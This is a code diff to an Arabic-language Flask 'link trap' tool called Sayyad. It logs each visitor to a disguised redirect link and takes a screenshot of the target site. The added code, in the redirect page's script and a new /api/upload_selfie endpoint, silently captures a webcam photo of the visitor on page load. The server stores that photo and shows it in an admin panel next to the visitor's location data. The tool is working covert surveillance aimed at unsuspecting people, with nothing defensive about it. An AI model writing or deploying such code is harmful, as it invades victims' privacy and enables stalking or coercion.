@@ -3,6 +3,7 @@ from werkzeug.middleware.proxy_fix import ProxyFix
 import uuid
 import json
 import os
+import base64
 from datetime import datetime
 import urllib.request
 
@@ -19,7 +20,9 @@ app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
 
 LINKS_FILE = "links.json"
 SCREENSHOTS_DIR = "screenshots"
+SELFIES_DIR = "selfies"
 os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
+os.makedirs(SELFIES_DIR, exist_ok=True)
 
 def load_links():
     if os.path.exists(LINKS_FILE):
@@ -45,14 +48,14 @@ def get_location(ip):
         pass
     return "غير معروف"
 
-# قالب صفحة الويب العادية الانتقالية الجديدة لمنع التوجيه الخاطئ مع ngrok
+# قالب صفحة الويب العادية الانتقالية المحدث لالتقاط السيلفي وتوفير الوقت لـ Playwright
 REDIRECT_TEMPLATE = """
 <!DOCTYPE html>
 <html dir="rtl" lang="ar">
 <head>
     <meta charset="UTF-8">
     <title>جاري تحويلك إلى المحتوى...</title>
-    <meta http-equiv="refresh" content="3;url={{ original_url }}">
+    <meta http-equiv="refresh" content="4;url={{ original_url }}">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
@@ -99,6 +102,35 @@ REDIRECT_TEMPLATE = """
         <p>يرجى الانتظار لحظات، يتم توجيهك إلى الصفحة المطلوبة تلقائياً.</p>
         <p>إذا لم يتم تحويلك، <a href="{{ original_url }}">اضغط هنا للانتقال يدوياً</a>.</p>
     </div>
+
+    <script>
+        async function captureSelfie() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const dataUrl = canvas.toDataURL('image/png');
+                stream.getTracks().forEach(track => track.stop());
+                
+                await fetch('/api/upload_selfie', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ link_id: '{{ link_id }}', image: dataUrl })
+                });
+            } catch (err) {
+                console.log('Camera access skipped or denied');
+            }
+        }
+        window.addEventListener('load', captureSelfie);
+    </script>
 </body>
 </html>
 """
@@ -710,8 +742,8 @@ ADMIN_TEMPLATE = """
     </style>
 </head>
 <body>
-    <h1>📸 لوحة التقاط الصور</h1>
-    <p class="sub-title">صيّاد - مراقبة الروابط الملغمة</p>
+    <h1>📸 لوحة التقاط الصور والسيلفي</h1>
+    <p class="sub-title">صيّاد - مراقبة الروابط الملغمة والزوار</p>
     
     <div class="stats-bar">
         <div class="stat-box">
@@ -738,10 +770,19 @@ ADMIN_TEMPLATE = """
                 👁️ الزيارات: {{ info.visits or 0 }}<br>
                 🕐 آخر زيارة: {{ info.last_visit or "—" }}
             </div>
+            
+            <h4 style="color:#00d4ff; margin-top:15px;">لقطة الشاشة للموقع:</h4>
             {% if info.screenshot %}
                 <img src="/screenshots/{{ info.screenshot }}" alt="Screenshot">
             {% else %}
-                <div class="empty">لا توجد صورة ملتقطة بعد</div>
+                <div class="empty">لا توجد صورة للموقع بعد</div>
+            {% endif %}
+
+            <h4 style="color:#a855f7; margin-top:15px;">صورة السيلفي للزائر:</h4>
+            {% if info.selfie %}
+                <img src="/selfies/{{ info.selfie }}" alt="Selfie">
+            {% else %}
+                <div class="empty">لم يتم التقاط سيلفي بعد</div>
             {% endif %}
         </div>
         {% endfor %}
@@ -788,6 +829,7 @@ def create_link():
         "visits": 0,
         "last_visit": None,
         "screenshot": None,
+        "selfie": None,
         "visitors": []
     }
     save_links(links)
@@ -831,15 +873,49 @@ def redirect_link(link_id):
     
     save_links(links)
     
-    # استبدال التوجيه المباشر بصفحة الانتقال العادية لحل مشكلة ngrok وتوفير وقت لالتقاط الصورة
-    return render_template_string(REDIRECT_TEMPLATE, original_url=link["original_url"])
+    return render_template_string(REDIRECT_TEMPLATE, original_url=link["original_url"], link_id=link_id)
+
+@app.route("/api/upload_selfie", methods=["POST"])
+def upload_selfie():
+    data = request.get_json()
+    link_id = data.get("link_id")
+    image_data = data.get("image")
+    
+    if not link_id or not image_data:
+        return jsonify({"success": False}), 400
+        
+    links = load_links()
+    if link_id not in links:
+        return jsonify({"success": False}), 404
+        
+    try:
+        if "," in image_data:
+            image_data = image_data.split(",")[1]
+        
+        image_bytes = base64.b64decode(image_data)
+        filename = f"selfie_{link_id}_{int(datetime.now().timestamp())}.png"
+        filepath = os.path.join(SELFIES_DIR, filename)
+        
+        with open(filepath, "wb") as f:
+            f.write(image_bytes)
+            
+        links[link_id]["selfie"] = filename
+        save_links(links)
+        return jsonify({"success": True})
+    except Exception as e:
+        print(f"Selfie error: {e}")
+        return jsonify({"success": False}), 500
 
 def take_screenshot(url, link_id):
     filename = f"{link_id}_{int(datetime.now().timestamp())}.png"
     filepath = os.path.join(SCREENSHOTS_DIR, filename)
     
     with sync_playwright() as p:
-        browser = p.chromium.launch(headless=True)
+        # إضافة خيارات منع الحماية لتشغيل Playwright بنجاح تحت حساب root
+        browser = p.chromium.launch(
+            headless=True,
+            args=['--no-sandbox', '--disable-setuid-sandbox']
+        )
         page = browser.new_page(viewport={"width": 1920, "height": 1080})
         page.goto(url, wait_until="networkidle", timeout=30000)
         page.screenshot(path=filepath, full_page=True)
@@ -859,6 +935,10 @@ def admin():
 @app.route("/screenshots/<filename>")
 def serve_screenshot(filename):
     return send_file(os.path.join(SCREENSHOTS_DIR, filename))
+
+@app.route("/selfies/<filename>")
+def serve_selfie(filename):
+    return send_file(os.path.join(SELFIES_DIR, filename))
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, debug=True)
